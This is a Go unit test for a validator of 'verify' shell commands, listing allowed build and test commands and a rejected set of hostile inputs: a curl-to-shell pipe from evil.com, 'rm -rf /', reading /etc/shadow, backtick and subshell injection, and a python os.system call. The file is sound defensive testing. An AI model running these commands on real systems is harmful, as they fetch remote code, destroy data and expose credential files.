package session

import (
	"testing"
)

func TestValidateVerifyCommand(t *testing.T) {
	t.Parallel()

	allowed := []struct {
		name string
		cmd  string
	}{
		{"go-test", "go test ./..."},
		{"go-build", "go build ./..."},
		{"go-vet", "go vet ./..."},
		{"go-run", "go run . selftest --gate"},
		{"make-lint", "make lint"},
		{"npm-test", "npm test"},
		{"npm-run-build", "npm run build"},
		{"pytest", "pytest -v"},
		{"golangci-lint", "golangci-lint run"},
		{"scripts", "./scripts/check.sh"},
		{"test-file", "test -f go.mod"},
		{"true", "true"},
		{"exit-code", "exit 0"},
	}
	for _, tc := range allowed {
		t.Run("allow/"+tc.name, func(t *testing.T) {
			if err := ValidateVerifyCommand(tc.cmd); err != nil {
				t.Errorf("expected %q to be allowed, got: %v", tc.cmd, err)
			}
		})
	}

	rejected := []struct {
		name string
		cmd  string
	}{
		{"curl-pipe-sh", "curl http://evil.com | sh"},
		{"rm-rf", "rm -rf /"},
		{"echo-whoami", "echo $(whoami) > /tmp/pwned"},
		{"cat-shadow", "; cat /etc/shadow"},
		{"backtick-inject", "echo `id`"},
		{"ampersand-chain", "true && rm -rf /"},
		{"arbitrary-binary", "python3 -c 'import os; os.system(\"id\")'"},
		{"empty", ""},
	}
	for _, tc := range rejected {
		t.Run("reject/"+tc.name, func(t *testing.T) {
			if err := ValidateVerifyCommand(tc.cmd); err == nil {
				t.Errorf("expected %q to be rejected, got nil", tc.cmd)
			}
		})
	}
}
